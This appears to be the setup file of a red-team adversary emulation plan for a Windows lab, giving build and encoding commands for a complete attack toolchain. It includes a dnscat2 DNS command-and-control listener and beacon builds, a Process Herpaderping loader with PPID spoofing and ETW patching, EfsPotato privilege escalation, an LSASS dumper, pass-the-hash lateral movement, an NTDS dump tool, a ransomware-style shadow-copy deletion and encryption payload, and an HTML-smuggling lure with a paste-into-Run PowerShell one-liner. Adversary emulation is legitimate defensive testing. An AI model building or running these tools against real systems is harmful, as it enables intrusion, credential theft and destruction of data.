# Setup

## Overview

This document covers all pre-operation build and encoding steps required before executing any phase of the emulation plan. Complete all steps in this file before running Phase 1.

**Working directory:** Relative paths (`resources/...`) assume the shell’s current directory is `testlab-enterprise/windows-adversary-plan/` (the folder that contains `resources/` and `Emulation_Plan/`).

### Payload inventory

| Attack Path | Phase / Step | Role | Staged Name | Binary / Source |
| - | - | - | - | - |
| **HTML Smuggling** | Phase 1 Step 1 | HTML smuggling lure | `staging.html` | `resources/payloads/T1189/.../encode-command.py` (Python) |
| **HTML Smuggling** | Phase 1 Step 2 | VBScript/HTA dropper | Embedded in `cert_bundle.txt` | `stage1.hta` (same folder as `encode-command.py`) |
| **HTML Smuggling** | Phase 1 Step 2 | Process Herpaderping loader | `CWLHerpaderping.exe` (on upload) then `CertEnrollAgent.exe` | `resources/payloads/CWLHerpaderping/` (C++ MSVC) |
| **HTML Smuggling** | Phase 1 Step 2 | DNS C2 beacon | `dnscat2.exe` (on upload) then `CertCA.bin` | `resources/payloads/dnscat2/go-client/` (Go) |
| **IIS Server-Side** | Phase 1 Step 1B | `SeImpersonatePrivilege` → elevated run | `CertEnrollSvc.exe` | `resources/payloads/EfsPotato/` (C# source + pre-built `.exe`) |
| **IIS Server-Side** | Phase 1 Step 1 | Process Herpaderping loader | `CertEnrollAgent.exe` | `resources/payloads/CWLHerpaderping/` (C++ MSVC) |
| **IIS Server-Side** | Phase 1 Step 1 | DNS C2 beacon | `dnscat2.exe` (reflectively loaded) | `resources/payloads/dnscat2/go-client/` (Go) |
| **IIS Server-Side** | Phase 2 Step 1 | LSASS reflection dumper | `WdiBoot.exe` | `resources/payloads/LsassReflectDumping/` (C++ MSVC) |
| **IIS Server-Side** | Phase 2 Step 2 | Security software enumeration | `WmiAvQuery.exe` | `resources/payloads/WmiAvQuery/` (C++ MSVC/MinGW) |
| **IIS Server-Side** | Phase 3 Step 1 | PtH SMB transfer + WMI/SCM exec | `go-thehash.exe` | `resources/payloads/go-thehash/` (Go) |
| **IIS Server-Side** | Phase 3 Steps 5 & 6 | WMI persistence + logon script beacon | `policyupdate.exe` | `resources/payloads/dnscat2/go-client/dnscat2.exe` (Go) |
| **IIS Server-Side** | Phase 3 Step 7 | Windows service persistence beacon | `policysync.exe` | `resources/payloads/dnscat2/go-client/dnscat-service.exe` (Go, service wrapper) |
| **IIS Server-Side** | Phase 3 Step 7 | NT registry API-based service installer | `NtServiceInstaller.exe` | `resources/payloads/windows-service/syscalls-cpp/` (C++) |
| **IIS Server-Side** | Phase 3 Step 7B | SCM API-based service installer | `ServiceInstaller.exe` | `resources/payloads/windows-service/advapi32-cpp/` (C++) |
| **IIS Server-Side** | Phase 4 Step 1 | DC NTDS raw dump + archive + encrypt | `NtdsRawDump.exe` | `resources/payloads/NtdsRawDump/NtdsRawDump.cs` (C#, built in-phase) |
| **IIS Server-Side** | Phase 5 Step 1 | VSS deletion + service stop + AES-256 encryption | `CertMaint.exe` | `resources/payloads/ImpactPayload/impact.c` (C, pre-built as `impact.exe`) |

---

## Step 0 — Setup

### Procedures

#### dnscat2 server (Ruby)

- ☣️ On the attacker machine, start the dnscat2 server listener

  ```bash
  ruby dnscat2.rb --dns "domain=crl.ms-cert.net,host=0.0.0.0" --security=open --secret=c7517dee4fcbe16a0c8c1f98cdc5ce4e
  ```

  - ***Expected Output***

    ```text
    New window created: 0
    dnscat2> Listening for connections...
    ```

#### `dnscat2.exe` (Go DNS tunnel client)

**Code flow (from source):** `resources/payloads/dnscat2/go-client/cmd/dnscat/main.go` parses flags (domain, `--dns-server`, secret, session mode: ping / console / `-exec` / default command session). If `--dns-server` is empty, it calls `getSystemDNS()` (registry: static `NameServer` before `DhcpNameServer` per adapter); fallback `8.8.8.8`. It configures `session` encryption and delay, then builds a `session.Session` and runs the DNS driver (`pkg/tunnel/dns`) under `pkg/controller` with `pkg/driver/command` (or console/exec drivers depending on flags).

**Build:**

On Windows, `getSystemDNS()` applies to the **built Windows binary** when run on a victim; the compiler host only needs Go.

**Bash (Linux / macOS / Git Bash):**

```bash
cd resources/payloads/dnscat2/go-client
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
  -X main.DefaultDomain=crl.ms-cert.net \
  -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" \
  -o dnscat2.exe ./cmd/dnscat/
```

**PowerShell (Windows):**

```powershell
Set-Location resources\payloads\dnscat2\go-client
$env:GOOS = "windows"
$env:GOARCH = "amd64"
go build `
  -ldflags "-s -w -H windowsgui -X main.DefaultDomain=crl.ms-cert.net -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" `
  -o dnscat2.exe `
  ./cmd/dnscat/
Remove-Item Env:\GOOS -ErrorAction SilentlyContinue
Remove-Item Env:\GOARCH -ErrorAction SilentlyContinue
```

Output: `resources/payloads/dnscat2/go-client/dnscat2.exe`

#### `dnscat-service.exe` (Go, Windows service wrapper)

**Code flow (from source):** `cmd/dnscat-service/main.go` calls `svc.IsWindowsService()`. **Service path:** `runService()` → `LoadConfigFromRegistry()` (`HKLM\SYSTEM\CurrentControlSet\Services\dnscat2\Parameters`, else build-time defaults from `-ldflags` in `config.go`) → `svc.Run("dnscat2", &dnscat2Service{config})`. `service.go` `Execute` reports state to SCM, starts `runDnscat(config)` in a goroutine, handles stop/shutdown (cancels context, may call `controller.Destroy()`). **Interactive path:** `runInteractive()` parses flags and calls `runDnscat` directly. `runDnscat` mirrors the client: resolve DNS server (`config` → `getSystemDNS()` → `8.8.8.8`), create exec or command session, attach DNS tunnel.

**Build:**

**Bash:**

```bash
cd resources/payloads/dnscat2/go-client
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
  -X main.DefaultDomain=crl.ms-cert.net \
  -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" \
  -o dnscat-service.exe ./cmd/dnscat-service/
```

**PowerShell:**

```powershell
Set-Location resources\payloads\dnscat2\go-client
$env:GOOS = "windows"
$env:GOARCH = "amd64"
go build `
  -ldflags "-s -w -H windowsgui -X main.DefaultDomain=crl.ms-cert.net -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" `
  -o dnscat-service.exe `
  ./cmd/dnscat-service/
Remove-Item Env:\GOOS -ErrorAction SilentlyContinue
Remove-Item Env:\GOARCH -ErrorAction SilentlyContinue
```

Output: `resources/payloads/dnscat2/go-client/dnscat-service.exe`

#### `CWLHerpaderping.exe` (C++, Process Herpaderping loader)

**Code flow (from source):** `CWLImplant.cpp` — `main()` calls `GetPayloadBuffer()` to obtain the PE bytes, then `Herpaderping()` to execute it as a ghost process.

**Payload loading — two modes, selected at runtime by stdin type:**

- **Mode 1 — Stdin pipe (T1620, primary):** `GetFileType(STD_INPUT_HANDLE) == FILE_TYPE_PIPE` → reads 4-byte little-endian size header then PE bytes from stdin via `ReadFile` into a heap buffer. **No disk file artifact.** Used by the react2shell `herpload` command.
- **Mode 2 — File fallback (T1070.004):** Stdin is not a pipe → `CreateFileW(PAYLOAD_PATH)` reads the PE into heap, then `DeleteFileW(PAYLOAD_PATH)` deletes the file immediately. `PAYLOAD_PATH` is `L"C:\\temp\\payload64.exe"` by default (`CWLImplant.cpp` line 13 `#ifndef PAYLOAD_PATH`); override at build time with `/p:CustomPayloadPath=` (double backslashes required).

**ETW patching (`PatchEtw()`) — OPT-IN, disabled by default:** `PatchEtw()` patches `ntdll!EtwEventWrite` to `xor eax,eax; ret` to suppress ETW telemetry (T1562.006). It is guarded by `#ifdef ENABLE_ETW_PATCH` in `CWLImplant.cpp` and is **not compiled in** unless explicitly requested. The default emulation-plan build omits this.

**`Herpaderping()`** initializes five indirect syscall stubs (`NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`) via `InitSyscallPool` / `SealSyscallPool`. It writes the PE into a `%TEMP%\HD*.tmp` file, creates an `SEC_IMAGE` section from it, calls `GetNonJobParent()` to find a Session 0 `svchost.exe` (fallback: `wininit.exe`) for PPID spoofing, spawns the ghost via `NtCreateProcessEx`, re-assigns the ghost's token to the caller's token via `NtSetInformationProcess(ProcessAccessToken)`, overwrites the temp file with junk (`"Hello From CyberWarFare Labs"`), writes spoofed `RTL_USER_PROCESS_PARAMETERS` (`ImagePathName=RuntimeBroker.exe`) into the ghost PEB, then starts the payload thread via `NtCreateThreadEx`. The five NT calls are wrapped with `StackSpoofer` (fake `kernel32.dll` return address).

**Build — default (Mode 1 primary, static CRT, no ETW patch):**

`Release x64` in `.vcxproj` sets `<RuntimeLibrary>MultiThreaded</RuntimeLibrary>` (`/MT`) — fully static CRT, **no VC runtime DLL required** on the target. This is hardcoded for the `Release|x64` config only; do not use `Debug` or `Win32` configs for deployment.

```powershell
Set-Location resources\payloads\CWLHerpaderping
msbuild CWLHerpaderping.sln `
  /p:Configuration=Release `
  /p:Platform=x64 `
  /t:Rebuild /m
```

**Optional — enable ETW suppression (T1562.006):**

```powershell
msbuild CWLHerpaderping.sln `
  /p:Configuration=Release /p:Platform=x64 `
  /p:ETWPatch=1 `
  /t:Rebuild /m
```

**Optional — override Mode 2 payload path (double backslashes required):**

```powershell
msbuild CWLHerpaderping.sln `
  /p:Configuration=Release /p:Platform=x64 `
  /p:CustomPayloadPath="C:\\ProgramData\\CertCA.bin" `
  /p:CWLDebug=1 `
  /t:Rebuild /m
```

Output: `resources\payloads\CWLHerpaderping\x64\Release\CWLHerpaderping.exe`

#### `CertEnrollSvc.exe` (EfsPotato — C#)

**Code flow (from source):** `resources/payloads/EfsPotato/CertEnrollSvc.cs`, class `CertEnrollmentAgent`, `Main`: requires argv[0] = command line for payload; optional argv[1] = RPC endpoint name (`lsarpc`, `efsrpc`, `samr`, `lsass`, `netlogon`). Enables `SeImpersonatePrivilege`, creates a named pipe under `\\.\pipe\<guid>\pipe\srvsvc`, starts a listener thread and an **RPC channel** thread to trigger a privileged client connect, waits up to 3s, then **`ImpersonateNamedPipeClient`**, opens the impersonation token, and **`CreateProcessAsUser`** to run `args[0]` with stdout/stderr redirected through a pipe (optional output reader thread). Cleanup closes handles.

Repo ships a **pre-built** `CertEnrollSvc.exe`. To rebuild from source:

```cmd
cd resources\payloads\EfsPotato
csc /target:exe /platform:x64 /optimize+ /out:CertEnrollSvc.exe CertEnrollSvc.cs -nowarn:1691,618
```

Output: `resources\payloads\EfsPotato\CertEnrollSvc.exe`

#### `ReflectDump.exe` (C++, LSASS dump via reflection)

**Code flow (from source):** `ReflectDump/ReflectDump/Source.cpp` — verifies elevated token, resolves `lsass.exe` PID via snapshot, opens process, loads `ntdll`, resolves `RtlCreateProcessReflection`, clones LSASS into a **reflection child** process. After a delay, calls **`MiniDumpWriteDump`** on the child with a callback that **streams minidump bytes into a heap buffer** (`DiagBufferCallback` / `g_DiagBuffer`). Dumps are XORed (`XorBuffer`, key `0x35`), written to `f.elif`, then the reflection process is terminated. Uses DbgHelp `MiniDumpWithFullMemory`.

**Build:**

```powershell
msbuild resources\payloads\LsassReflectDumping\ReflectDump\ReflectDump.sln `
  /p:Configuration=Release /p:Platform=x64 `
  /p:LanguageStandard=stdcpp20 `
  /p:RuntimeLibrary=MultiThreaded `
  /m
```

> **Note:** `LanguageStandard=stdcpp20` is required because `Header.h` includes `<format>` (C++20); the `.vcxproj` does not set this. `RuntimeLibrary=MultiThreaded` overrides the missing `/MT` in the `.vcxproj` Release config to produce a fully static binary with no VC runtime DLL dependency.

Output: `resources\payloads\LsassReflectDumping\ReflectDump\x64\Release\ReflectDump.exe`

#### `ServiceInstaller.exe` (C++, SCM via advapi32)

**Code flow (from source):** `advapi32-cpp/main.cpp` `wmain`: requires admin (`IsAdministrator`), dispatches `install` / `uninstall` / `start` / `stop` / `status` / `help`. **`InstallService`** (`service_installer.cpp`): `OpenSCManagerW`, `CreateServiceW` (own process, auto-start, image path), optional `ChangeServiceConfig2W` description; uninstall stops then `DeleteService`. Start/stop/status use `OpenServiceW` + `StartService` / `ControlService` / `QueryServiceStatus`.

**Build:** No `.vcxproj` in repo.

**MinGW-w64:**

```bash
cd resources/payloads/windows-service/advapi32-cpp
g++ -o ServiceInstaller.exe main.cpp service_installer.cpp -ladvapi32 -municode -static -s -O2
```

**MSVC** (x64 Native Tools):

```cmd
cd resources\payloads\windows-service\advapi32-cpp
cl /EHsc /O2 /MT /Fe:ServiceInstaller.exe main.cpp service_installer.cpp advapi32.lib /link /SUBSYSTEM:CONSOLE
```

Output: `resources/payloads/windows-service/advapi32-cpp/ServiceInstaller.exe`

#### `NtServiceInstaller.exe` (C++, service registry via `Nt*` APIs)

**Code flow (from source):** `syscalls-cpp/main.cpp` same CLI shape as advapi32 variant. **`InstallService`**: `InitNtFunctions()`, then `NtOpenKey` / `NtCreateKey` under the Services registry path, **`NtSetValueKey`** for `Type`, `Start`, `ErrorControl`, `ImagePath`, `DisplayName`, `ObjectName` (LocalSystem), optional `Description` — **no `CreateService`**. **`UninstallService`**: `StopServiceByName` (SCM) then `NtDeleteKey` on the service subkey. **`StartServiceByName` / `StopServiceByName` / `GetServiceStatusByName`** use **`OpenSCManagerW` / `OpenServiceW` / `StartServiceW` / `ControlService` / `QueryServiceStatus`** so operators can start registry-installed services once SCM knows about them.

**Build:**

**MinGW-w64:**

```bash
cd resources/payloads/windows-service/syscalls-cpp
g++ -o NtServiceInstaller.exe main.cpp nt_api.cpp service_installer.cpp -ladvapi32 -municode -static -s -O2
```

**MSVC:**

```cmd
cd resources\payloads\windows-service\syscalls-cpp
cl /EHsc /O2 /MT /Fe:NtServiceInstaller.exe main.cpp nt_api.cpp service_installer.cpp advapi32.lib /link /SUBSYSTEM:CONSOLE
```

Output: `resources/payloads/windows-service/syscalls-cpp/NtServiceInstaller.exe`

#### `WmiAvQuery.exe` (C++, WMI-based security software enumeration)

**Code flow (from source):** `WmiAvQuery/main.cpp` — initialises COM (`CoInitializeEx`, `CoInitializeSecurity`), creates `IWbemLocator` via `CoCreateInstance(CLSID_WbemLocator)`, connects to `ROOT\SecurityCenter2`, sets proxy blanket, then executes WQL query `SELECT * FROM AntiVirusProduct` via `IWbemServices::ExecQuery`. Enumerates results printing `displayName`, `instanceGuid`, `pathToSignedProductExe`, `pathToSignedReportingExe`, and parsed `productState` (enabled/disabled, definitions currency) for each registered AV product.

**Build:** No `.vcxproj`. Pre-built binary at `resources/payloads/WmiAvQuery/WmiAvQuery.exe`.

**MSVC** (x64 Native Tools Command Prompt):

```cmd
cd resources\payloads\WmiAvQuery
cl.exe /EHsc /O2 /MT /Fe:WmiAvQuery.exe main.cpp /link /SUBSYSTEM:CONSOLE
```

**MinGW-w64:**

```bash
cd resources/payloads/WmiAvQuery
g++ -O2 -s -static -std=c++11 -o WmiAvQuery.exe main.cpp -lwbemuuid -lole32 -loleaut32
```

Output: `resources/payloads/WmiAvQuery/WmiAvQuery.exe`

#### `go-thehash.exe` (Go, Pass-the-Hash SMB / DCOM WMI / MS-SCMR)

**Code flow (from source):** `resources/payloads/go-thehash/main.go` — `main()` switches on subcommands: **`connect`** builds `spnego.NTLMInitiator` with raw NT hash hex and `smb.NewConnection`. **`put`/`get`/`del`/`ls`** use SMB tree/file APIs. **`exec`** → `execViaService`: `TreeConnect` `IPC$`, open **svcctl** pipe, DCE bind to MS-SCMR, **`CreateService`** with random name, **`StartService`** (timeout treated as non-fatal for fire-and-forget), **`DeleteService`**. **`exec-wmi`** → `execViaWMI`: DCOM to WMI, `Win32_Process.Create`. **`enum shares|sessions|users`** bind **srvsvc** or **samr** over SMB and call the corresponding RPCs (`NetShareEnumAll`, `NetSessionEnum`, `ListLocalUsers`).

**Build:**

**Bash:**

```bash
cd resources/payloads/go-thehash
go mod tidy
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o go-thehash.exe .
```

**PowerShell:**

```powershell
Set-Location resources\payloads\go-thehash
go mod tidy
$env:GOOS = "windows"
$env:GOARCH = "amd64"
go build -ldflags "-s -w" -o go-thehash.exe .
Remove-Item Env:\GOOS -ErrorAction SilentlyContinue
Remove-Item Env:\GOARCH -ErrorAction SilentlyContinue
```

Output: `resources/payloads/go-thehash/go-thehash.exe`

#### `NtdsRawDump.exe` (C#, DC NTDS raw dump)

**Build** (VS Developer Command Prompt / `csc` in PATH):

```powershell
Set-Location resources\payloads\NtdsRawDump
csc /optimize+ /debug- /out:NtdsRawDump.exe NtdsRawDump.cs `
    /r:System.Management.dll `
    /r:System.IO.Compression.dll
```

Output: `resources\payloads\NtdsRawDump\NtdsRawDump.exe`

#### `CertMaint.exe` / `impact.exe` (C, AES-256 impact payload)

**Build** (x64 Native Tools Command Prompt for VS):

```cmd
cd resources\payloads\ImpactPayload
cl /O2 /MT /W4 impact.c aes.c /Fe:impact.exe /link ole32.lib
```

> `/MT` static CRT + `ole32.lib` for COM/VSS. `advapi32` is resolved dynamically at runtime via `GetProcAddress` — do **not** add `advapi32.lib` to the link line.

Output: `resources\payloads\ImpactPayload\impact.exe`

#### HTML Smuggling Path Setup

**`encode-command.py` (HTA → polyglot PEM + HTML smuggling)**

**Code flow (from source):** `resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py` reads `stage1.hta`, base64-wraps it as fake PEM (`encode_pem`), embedding a **PowerShell polyglot** after a block comment: the PS strip finds base64 lines in `cert_bundle.txt`, decodes to `%TEMP%`, renames to `.hta`, launches **`mshta.exe`**. Then `inject_smuggled_payload` replaces `var b64 = '...'` in `staging.html` with base64 of the entire `cert_bundle.txt` so the browser download carries the payload without a second fetch.

**Run:**

```bash
cd resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/
python encode-command.py
```

- ***Expected Output***

  ```text
  [+] stage1.hta -> cert_bundle.txt
      Original : 4,xxx bytes
      PEM      : 6,xxx bytes

  [+] Smuggled payload -> staging.html (x,xxx b64 chars)

  --- paste into Win+R ---
  powershell -w h -ep bypass -c "iex(gc -Raw '%USERPROFILE%\Downloads\cert_bundle.txt')"
  ```

#### IIS Server-Side Path Setup

**Encode & Compress Payloads for react2shell**

All `.b64` files are generated by `encode_payload.py` (or `compress_payload.py`) and consumed by react2shell's chunked upload mechanism. Output lives in `resources/payloads/react2shell-tool/`.

**Run (after binaries exist):**

```bash
cd resources/payloads/react2shell-tool

# Phase 1 Step 1B only — dnscat2.b64 required for herpload (reflective stdin path)
# Phase 1 Step 1A uses the `stage` command which reads raw binaries directly — no .b64 needed
python encode_payload.py ../dnscat2/go-client/dnscat2.exe                           -o dnscat2.b64          -l 0

# Phase 2 Step 1 — LSASS dumper (Compressed via gzip + base64)
python compress_payload.py ../LsassReflectDumping/ReflectDump/x64/Release/ReflectDump.exe -o WdiBoot.gz.b64 --b64 -l 0

# Phase 2 Step 2 — Security software discovery
python encode_payload.py ../WmiAvQuery/WmiAvQuery.exe                                    -o WmiAvQuery.b64   -l 0

# Phase 3 Step 1 — Lateral movement (PtH)
python encode_payload.py ../go-thehash/go-thehash.exe                               -o go-thehash.b64         -l 0

# Phase 3 Steps 5 & 6 — WMI persistence and logon script beacon
python encode_payload.py ../dnscat2/go-client/dnscat2.exe                           -o policyupdate.exe.b64   -l 0

# Phase 3 Step 7 — Windows service persistence beacon + service installers
python encode_payload.py ../dnscat2/go-client/dnscat-service.exe                    -o policysync.exe.b64     -l 0
python encode_payload.py ../windows-service/advapi32-cpp/ServiceInstaller.exe        -o ServiceInstaller.b64   -l 0
python encode_payload.py ../windows-service/syscalls-cpp/NtServiceInstaller.exe      -o NtServiceInstaller.b64 -l 0

# Phase 4 Step 1 — DC NTDS raw dump
python encode_payload.py ../NtdsRawDump/NtdsRawDump.exe                              -o NtdsRawDump.b64        -l 0

# Phase 5 Step 1 — Impact payload (deployed as CertMaint.exe)
python encode_payload.py ../ImpactPayload/impact.exe                                 -o CertMaint.b64          -l 0
```

- ***Expected Output (representative for `encode_payload.py`)***

  ```text
  [+] Encoding successful!
  [*] Original size: <N> bytes
  [*] Base64 size: <N> bytes
  [*] Output file: <name>.b64 (<N> bytes)
  [*] Lines: ...
  ```

- ***Expected Output (for `compress_payload.py`)***

  ```text
  [+] Compression successful!
  [*] Original size: <size> bytes
  [*] Compressed size: <compressed_size> bytes
  [*] Compression ratio: ~62%
  [*] Output file: WdiBoot.gz.b64
  ```

